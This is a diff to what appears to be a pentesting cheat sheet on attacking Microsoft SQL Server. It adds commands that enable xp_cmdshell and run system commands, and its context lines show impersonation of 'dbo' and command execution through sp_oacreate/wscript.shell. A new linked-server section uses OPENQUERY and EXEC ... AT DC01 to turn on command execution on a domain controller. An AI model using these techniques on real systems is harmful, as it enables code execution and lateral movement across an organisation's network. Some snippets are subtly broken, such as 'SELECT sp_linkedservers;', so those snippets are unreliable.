@@ -36,6 +36,10 @@ $connectionString = "Server=dc01;database=master;Integrated Security=True"; $sql
 
 ## Command execution via xp_cmdshell or sp_oacreate/sp_oamethod
 
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell whoami;
+```
+
 asuser
 ```sql
 use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';
@@ -138,5 +142,25 @@ public class StoredProcedure
 
 ```
 
+<br><br>
+# Linked SQL servers
+
+The sp_linkedservers stored procedure returns a list of linked servers for us.
+Use OPENQUERY OR AT 
+
+```sql
+SELECT sp_linkedservers; 
+```
+
+Execute queries across linked SQL servers.  The command below executes commands against DC01.
+
+```sql
+select version from openquery("dc01", 'select @@version as version')
+```
 
 
+AT Keyword in queries to run query in another server
+
+```sql
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT DC01, $sqlconn)
+```
